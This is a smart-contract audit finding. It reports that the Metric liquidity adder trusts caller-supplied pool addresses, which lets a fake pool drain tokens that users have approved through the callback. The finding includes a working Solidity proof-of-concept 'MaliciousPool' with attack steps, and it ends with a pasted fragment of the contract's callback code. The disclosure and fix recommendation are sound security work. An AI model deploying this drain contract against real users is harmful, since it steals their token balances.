### Title
Unverified Pool Address in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain User Tokens via Callback - (File: `metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol`)

### Summary

`MetricOmmPoolLiquidityAdder` accepts a caller-supplied `pool` address and stores it as the trusted callback counterparty in transient storage without verifying it against the factory. A malicious contract posing as a pool can call back into `metricOmmModifyLiquidityCallback`, pass the caller-check (because it is the stored `expectedPool`), and pull up to `maxAmountToken0`/`maxAmountToken1` of any tokens the victim has approved to the adder.

### Finding Description

The contract's own NatSpec acknowledges the gap:

> *"This contract does not verify the pool against the factory; a malicious pool can request token pulls up to the caller-provided max caps during callback settlement."* [1](#0-0) 

Every entry-point (`addLiquidityExactShares`, `addLiquidityWeighted`) passes the raw caller-supplied `pool` directly to `_addLiquidity`, which stores it in transient slot `T_SLOT_PAY_POOL` as the authoritative expected callback caller: [2](#0-1) [3](#0-2) [4](#0-3) 

The callback then validates only that `msg.sender == expectedPool` (the attacker-controlled address) and that the requested amounts do not exceed the user-supplied caps: [5](#0-4) 

Token identities are read from `IMetricOmmPool(msg.sender).getImmutables()` — i.e., from the malicious pool itself — so the attacker controls which tokens are pulled: [6](#0-5) 

By contrast, the sister contract `MetricOmmSimpleRouter` calls `_requireFactoryPool(pool)` before storing any pool in transient context, which rejects non-factory addresses: [7](#0-6) [8](#0-7) 

`MetricOmmPoolLiquidityAdder` has no equivalent guard.

### Impact Explanation

Any user who has approved tokens to `MetricOmmPoolLiquidityAdder` and calls any `addLiquidity*` variant with an attacker-supplied pool address loses up to `maxAmountToken0` of `token0` and `maxAmountToken1` of `token1` in a single transaction. The attacker controls which tokens are named via `getImmutables()`, so any approved token is at risk. This is a direct, complete loss of user principal with no recovery path.

### Likelihood Explanation

The trigger is fully unprivileged: any external caller can supply an arbitrary `pool` address. No special role, no malicious initial setup of a legitimate pool, and no non-standard token behavior is required. The attack is atomic and requires only that the victim has a non-zero approval to the adder — a normal precondition for using the contract.

### Recommendation

Add a factory membership check at the top of `_addLiquidity` (or in each public entry-point), mirroring the guard already present in `MetricOmmSwapRouterBase`:

```solidity
if (!FACTORY.isPool(pool)) revert InvalidPool(pool);
```

This requires storing the factory address as an immutable in `MetricOmmPoolLiquidityAdder`, exactly as `MetricOmmSwapRouterBase` does.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {IMetricOmmPoolActions} from "@metric-core/interfaces/IMetricOmmPool/IMetricOmmPoolActions.sol";
import {IMetricOmmPool, PoolImmutables} from "@metric-core/interfaces/IMetricOmmPool/IMetricOmmPool.sol";
import {LiquidityDelta} from "@metric-core/types/PoolOperation.sol";
import {IMetricOmmModifyLiquidityCallback}
    from "@metric-core/interfaces/callbacks/IMetricOmmModifyLiquidityCallback.sol";
import {MetricOmmPoolLiquidityAdder} from "metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @notice Malicious pool that drains victim tokens via the liquidity adder callback.
contract MaliciousPool {
    address public immutable token0;
    address public immutable token1;
    address public immutable adder;

    constructor(address _token0, address _token1, address _adder) {
        token0 = _token0;
        token1 = _token1;
        adder = _adder;
    }

    // Implements IMetricOmmPoolActions.addLiquidity — immediately calls back the adder.
    function addLiquidity(
        address, uint80, LiquidityDelta calldata, bytes calldata, bytes calldata
    ) external returns (uint256, uint256) {
        // Request the full caps the victim authorised.
        uint256 drain0 = IERC20(token0).allowance(tx.origin, adder);
        uint256 drain1 = IERC20(token1).allowance(tx.origin, adder);
        IMetricOmmModifyLiquidityCallback(adder)
            .metricOmmModifyLiquidityCallback(drain0, drain1, abi.encode(uint8(1))); // KIND_PAY = 1
        return (drain0, drain1);
    }

    // Returns attacker-chosen token addresses.
    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = token0;
        imm.token1 = token1;
    }
}

// Attack:
// 1. victim.approve(adder, USDC, 1000e6); victim.approve(adder, WETH, 1e18);
// 2. attacker deploys MaliciousPool(USDC, WETH, adder)
// 3. attacker calls adder.addLiquidityExactShares(
//        maliciousPool, victim, 0, deltas, 1000e6, 1e18, ""
//    )  — note: victim is msg.sender in the two-arg overload, or attacker passes victim explicitly
// 4. MaliciousPool.addLiquidity fires → callback drains 1000 USDC + 1 WETH from victim to MaliciousPool.
```

The `msg.sender != expectedPool` check at line 164 passes because `MaliciousPool` is exactly the address stored in transient storage. The `amount0Delta > max0` check at line 165 passes because the attacker sets the amounts to the caps. Token addresses come from `MaliciousPool.getImmutables()`, which the attacker controls entirely.   function metricOmmModifyLiquidityCallback(uint256 amount0Delta, uint256 amount1Delta, bytes calldata callbackData)
    external
    override
  {
    uint8 kind = abi.decode(callbackData, (uint8));
    if (kind == KIND_PROBE) {
      revert LiquidityProbe(amount0Delta, amount1Delta);
    }
    if (kind != KIND_PAY) revert InvalidCallbackKind();

    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
    if (amount0Delta > max0 || amount1Delta > max1) {
      revert MaxAmountExceeded(amount0Delta, amount1Delta, max0, max1);
    }

    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
    _clearPayContext();
